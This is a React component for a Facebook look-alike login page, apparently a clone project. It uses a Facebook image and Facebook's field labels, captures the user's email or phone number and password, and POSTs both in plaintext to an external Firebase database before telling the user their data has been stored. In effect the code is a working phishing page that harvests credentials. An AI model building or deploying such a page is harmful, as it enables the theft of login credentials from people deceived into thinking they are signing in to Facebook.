import React from "react";
// import FacebookLogin from './components/images/FacebookLogin'
import { Link } from "react-router-dom";
import Img1 from "./images/fbimage.png";
const Loginpage = () => {
  const [state, setState] = React.useState({
    textBlock: "",
    passwordBlock: "",
  });
  let name, value;
  const handlinginput = (event) => {
    name = event.target.name;
    value = event.target.value;

    setState({ ...state, [name]: value });
  };

  const submit = async (event) => {
    event.preventDefault();

    const res = await fetch(
      "https://react-fb-form-ebf41-default-rtdb.firebaseio.com/react-fb-form.json", // Replace with your Firebase database URL
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          textBlock: state.textBlock, // Assuming textBlock is a variable containing your data
          passwordBlock: state.passwordBlock, // Assuming passwordBlock is a variable containing your data
        }),
      }
    );
    if (res) {
      alert("your data has been stored");
      console.log(res);
      setState({
        textBlock: "",
        passwordBlock: "",
      });
    }
  };

  return (
    <div className="login-Page-overall">
      <div className="login-Sideimage">
        <img src={Img1} alt="image" />
        <h2> Thanks for stopping by!</h2> <br />
        <h4>We hope to see you again soon.</h4>
      </div>

      <div className="login-Block" method="POST">
        <div className="first-Block">
          <input
            type="text"
            name="textBlock"
            value={state.textBlock}
            className="text-Block"
            placeholder="Email address or phone number"
            onChange={handlinginput}
          />
        </div>

        <div className="second-Block">
          <input
            type="password"
            name="passwordBlock"
            value={state.passwordBlock}
            className="password-Block"
            placeholder="Password"
            onChange={handlinginput}
          />
        </div>

        <div className="third-Block" onClick={submit}>
          <b> Log in </b>
        </div>

        <a href="#" className="forgot-Pass">
          {" "}
          Forgotten password?
        </a>

        <br />
        <hr className="line-Seg" />

        <Link to="/signup">
          {" "}
          <div className="fourth-Block">
            <b> Create new account</b>
          </div>
        </Link>
      </div>
    </div>
  );
};

export default Loginpage;
